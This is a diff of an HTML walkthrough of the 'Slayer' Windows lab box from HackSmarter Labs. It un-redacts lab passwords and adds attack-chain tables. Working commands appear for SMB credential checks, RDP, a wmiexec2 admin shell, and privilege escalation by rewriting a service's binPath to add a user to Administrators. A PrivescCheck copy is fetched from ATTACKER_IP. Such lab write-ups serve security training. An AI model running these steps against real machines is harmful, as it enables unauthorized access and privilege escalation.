@@ -290,9 +290,15 @@ SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1002: EC2AMAZ-M1LFCNO\alice.
 
   <p>I discovered another user account: <code>alice.wonderland</code> - this could be useful later.</p>
 
-  <h3><span class="step">[Step 4]</span> RDP Access</h3>
+  <h3><span class="step">[Step 4]</span> Generating a Hosts File</h3>
+  <p>NetExec can automatically generate a hosts file entry for the target:</p>
+  <pre><code>$ nxc smb 10.1.140.139 -u tyler.ramsey -p 'P@ssw0rd!' --generate-hosts-file host_file
+$ cat host_file
+10.1.140.139     EC2AMAZ-M1LFCNO.EC2AMAZ-M1LFCNO EC2AMAZ-M1LFCNO</code></pre>
+
+  <h3><span class="step">[Step 5]</span> RDP Access</h3>
   <p>With port 3389 open, I connected via RDP using the provided credentials:</p>
-  <pre><code>$ xfreerdp /u:tyler.ramsey /p:'[REDACTED]' /v:10.1.140.139</code></pre>
+  <pre><code>$ xfreerdp /u:tyler.ramsey /p:'P@ssw0rd!' /v:10.1.140.139</code></pre>
 
   <p><img src="../assets/slayer/rdp-session.png" alt="RDP session established as tyler.ramsey" loading="lazy"></p>
 
@@ -303,7 +309,7 @@ SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1002: EC2AMAZ-M1LFCNO\alice.
     <strong>Path 1:</strong> PowerShell History Credential Leak (Fastest)
   </div>
 
-  <h3><span class="step">[Step 5]</span> PowerShell History Analysis</h3>
+  <h3><span class="step">[Step 6]</span> PowerShell History Analysis</h3>
 
   <div class="question">
     <strong>What is PowerShell History?</strong>
@@ -317,19 +323,21 @@ SMB         10.1.140.139    445    EC2AMAZ-M1LFCNO  1002: EC2AMAZ-M1LFCNO\alice.
 C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 PS C:\> type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-net user administrator "[REDACTED]"</code></pre>
+net user administrator "ebz0yxy3txh9BDE*yeh"</code></pre>
 
   <div class="key-finding">
-    <strong>Administrator password discovered:</strong> <code>[REDACTED]</code>
+    <strong>Administrator password discovered:</strong> <code>ebz0yxy3txh9BDE*yeh</code>
   </div>
 
-  <h3><span class="step">[Step 6]</span> Validating Administrator Credentials</h3>
+  <h3><span class="step">[Step 7]</span> Validating Administrator Credentials</h3>
   <p>I verified the credentials work using NetExec:</p>
-  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p '[REDACTED]'</code></pre>
+  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p 'ebz0yxy3txh9BDE*yeh'</code></pre>
 
   <p><img src="../assets/slayer/admin-creds-validated.png" alt="Administrator credentials validated via SMB" loading="lazy"></p>
 
-  <h3><span class="step">[Step 7]</span> Getting a Shell with wmiexec2</h3>
+  <h3><span class="step">[Step 8]</span> Getting a Shell with wmiexec2</h3>
+
+  <p>I used wmiexec2 to get an interactive shell as Administrator:</p>
 
   <div class="question">
     <strong>What is wmiexec2?</strong>
@@ -348,7 +356,7 @@ $ pip install setuptools</code></pre>
 
   <p><strong>Getting the root flag:</strong></p>
   <pre><code>$ ./wmiexec2.py EC2AMAZ-M1LFCNO/administrator@10.1.140.139
-Password: [[REDACTED]]
+Password: [ebz0yxy3txh9BDE*yeh]
 [*] SMBv3.0 dialect used
 [*] Launching wmiexec2
 [*] Press help for extra shell commands
@@ -377,7 +385,9 @@ C:\Users\Administrator\Desktop> type root.txt
     <strong>Path 2:</strong> Weak Service Permissions (Alternative Method)
   </div>
 
-  <h3><span class="step">[Step 8]</span> Finding Hidden Credentials</h3>
+  <p>This path involves finding credentials for another user and exploiting misconfigured service permissions.</p>
+
+  <h3><span class="step">[Step 9]</span> Finding Hidden Credentials</h3>
   <p>During manual enumeration, I discovered a <code>C:\Management</code> directory. Using the <code>-Force</code> flag to show hidden files:</p>
 
   <pre><code>PS C:\Management> dir -Force
@@ -392,22 +402,27 @@ Mode                 LastWriteTime         Length Name
 -a----         9/30/2025   6:18 PM           2044 Executive Summary - Q3 2025.pdf
 ...</code></pre>
 
-  <div class="note">
-    <strong>Note:</strong> The <code>a-hs-</code> flags indicate: <code>a</code> = archive, <code>h</code> = hidden, <code>s</code> = system. Hidden and system files are not shown by default, which is why <code>-Force</code> is needed.
+  <div class="question">
+    <strong>What does the Mode column mean?</strong>
+  </div>
+  <div class="answer">
+    <p>The <code>a-hs-</code> flags indicate: <code>a</code> = archive, <code>h</code> = hidden, <code>s</code> = system. Hidden and system files are not shown by default, which is why <code>-Force</code> is needed.</p>
   </div>
 
   <p>The hidden <code>desktop.ini</code> file contains credentials:</p>
   <pre><code>PS C:\Management> type .\desktop.ini
 [.ShellClassInfo]
-InfoTip=CREDS: alice.wonderland:[REDACTED]</code></pre>
+InfoTip=CREDS: alice.wonderland:2wsxzaq1@WSXZAQ!</code></pre>
 
   <div class="key-finding">
-    <strong>New credentials discovered:</strong> <code>alice.wonderland:[REDACTED]</code>
+    <strong>New credentials discovered:</strong> <code>alice.wonderland:2wsxzaq1@WSXZAQ!</code>
   </div>
 
   <p>I used these credentials to establish a new RDP session as <code>alice.wonderland</code>.</p>
 
-  <h3><span class="step">[Step 9]</span> Automated Privilege Escalation Enumeration</h3>
+  <h3><span class="step">[Step 10]</span> Automated Privilege Escalation Enumeration</h3>
+
+  <p>After finding that <code>alice.wonderland</code> has no special privileges or share access, I used PrivescCheck for automated enumeration.</p>
 
   <div class="question">
     <strong>What is PrivescCheck?</strong>
@@ -436,7 +451,7 @@ PS C:\> copy \\ATTACKER_IP\sharename\PrivescCheck.ps1 C:\Users\alice.wonderland\
 
   <p><img src="../assets/slayer/service-vulnerability-details.png" alt="Service binary path vulnerability details in HTML report" loading="lazy"></p>
 
-  <h3><span class="step">[Step 10]</span> Analyzing Service Permissions</h3>
+  <h3><span class="step">[Step 11]</span> Analyzing Service Permissions</h3>
 
   <div class="question">
     <strong>What is Service Binary Path Manipulation?</strong>
@@ -451,7 +466,7 @@ PS C:\> copy \\ATTACKER_IP\sharename\PrivescCheck.ps1 C:\Users\alice.wonderland\
 
   <p>The analysis revealed that the <code>alice.wonderland</code> user can change the service configuration for <code>SysMgmtAgent</code>.</p>
 
-  <h3><span class="step">[Step 11]</span> Exploiting the Service</h3>
+  <h3><span class="step">[Step 12]</span> Exploiting the Service</h3>
   <p>I modified the service binary path to add <code>tyler.ramsey</code> to the local Administrators group:</p>
 
   <pre><code>C:\Users\alice.wonderland> sc config SysMgmtAgent binPath= "cmd.exe /c net localgroup Administrators /add tyler.ramsey"
@@ -475,7 +490,7 @@ Administrator
 tyler.ramsey
 The command completed successfully.</code></pre>
 
-  <h3><span class="step">[Step 12]</span> Getting the Root Flag</h3>
+  <h3><span class="step">[Step 13]</span> Getting the Root Flag</h3>
   <p>With <code>tyler.ramsey</code> now in the Administrators group, I logged out and back in (or opened an elevated PowerShell session) to retrieve the flag:</p>
 
   <p><img src="../assets/slayer/root-flag-elevated.png" alt="Root flag obtained via elevated PowerShell" loading="lazy"></p>
@@ -483,28 +498,103 @@ The command completed successfully.</code></pre>
   <pre><code>PS C:\> type C:\Users\Administrator\Desktop\root.txt
 38355....</code></pre>
 
+  <h2>Flags</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Flag</th>
+        <th>Value</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Root</strong></td>
+        <td><code>38355....</code></td>
+      </tr>
+    </tbody>
+  </table>
+
   <h2>Attack Chain Summary</h2>
 
   <div class="attack-chain">
-    <p><strong>Path 1 (Fast Track):</strong></p>
-    <ol>
-      <li><strong>Credential Validation:</strong> Verified tyler.ramsey credentials via SMB</li>
-      <li><strong>RDP Access:</strong> Connected to workstation as tyler.ramsey</li>
-      <li><strong>PowerShell History:</strong> Found Administrator password in command history</li>
-      <li><strong>WMI Shell:</strong> Used wmiexec2 to retrieve root flag</li>
-    </ol>
+    <p><strong>Path 1 (Fastest):</strong></p>
+    <pre><code>tyler.ramsey:P@ssw0rd! -> RDP Access -> PowerShell History -> Admin Creds -> wmiexec2 -> ROOT</code></pre>
   </div>
 
   <div class="attack-chain">
-    <p><strong>Path 2 (Service Exploitation):</strong></p>
-    <ol>
-      <li><strong>Hidden Credential Discovery:</strong> Found alice.wonderland password in desktop.ini</li>
-      <li><strong>Lateral Movement:</strong> RDP as alice.wonderland</li>
-      <li><strong>Service Enumeration:</strong> PrivescCheck identified weak service permissions</li>
-      <li><strong>Service Exploitation:</strong> Modified SysMgmtAgent binary path</li>
-      <li><strong>Privilege Escalation:</strong> Added tyler.ramsey to Administrators group</li>
-    </ol>
+    <p><strong>Path 2 (Alternative):</strong></p>
+    <pre><code>tyler.ramsey:P@ssw0rd! -> RDP Access -> C:\Management\desktop.ini -> alice.wonderland creds
+                                                                          |
+                                      ROOT <- Service Start <- sc config SysMgmtAgent</code></pre>
   </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Result</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Nmap scan</td>
+        <td>Identified SMB (445), RDP (3389)</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Validate creds via SMB</td>
+        <td>Confirmed <code>tyler.ramsey:P@ssw0rd!</code> works</td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>RID brute force</td>
+        <td>Discovered <code>alice.wonderland</code> account</td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>RDP as tyler.ramsey</td>
+        <td>Initial access to workstation</td>
+      </tr>
+      <tr>
+        <td><strong>Path 1</strong></td>
+        <td>Check PowerShell history</td>
+        <td>Found admin password in <code>ConsoleHost_history.txt</code></td>
+      </tr>
+      <tr>
+        <td><strong>Path 1</strong></td>
+        <td>wmiexec2 as Administrator</td>
+        <td>Root flag obtained</td>
+      </tr>
+      <tr>
+        <td><strong>Path 2</strong></td>
+        <td>Enumerate hidden files</td>
+        <td>Found alice.wonderland creds in <code>desktop.ini</code></td>
+      </tr>
+      <tr>
+        <td><strong>Path 2</strong></td>
+        <td>RDP as alice.wonderland</td>
+        <td>Lateral movement</td>
+      </tr>
+      <tr>
+        <td><strong>Path 2</strong></td>
+        <td>PrivescCheck</td>
+        <td>Identified <code>SysMgmtAgent</code> service misconfiguration</td>
+      </tr>
+      <tr>
+        <td><strong>Path 2</strong></td>
+        <td>Modify service binary path</td>
+        <td>Added tyler.ramsey to Administrators group</td>
+      </tr>
+      <tr>
+        <td><strong>Path 2</strong></td>
+        <td>Elevated access</td>
+        <td>Root flag obtained</td>
+      </tr>
+    </tbody>
+  </table>
 
   <h2>Tools Used</h2>
   <ul class="tools-list">
@@ -538,6 +628,15 @@ The command completed successfully.</code></pre>
       <li>Multiple privilege escalation paths may exist - document alternatives for when primary paths are blocked</li>
     </ul>
   </div>
+
+  <h2>Summary</h2>
+
+  <p>This machine demonstrated two common Windows privilege escalation paths:</p>
+
+  <ol>
+    <li><strong>Credential Harvesting from PowerShell History</strong> - The fastest path, exploiting the common mistake of passing passwords as command-line arguments.</li>
+    <li><strong>Service Binary Path Manipulation</strong> - A more involved path requiring lateral movement to another user account and exploiting weak service permissions.</li>
+  </ol>
 
   <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
 
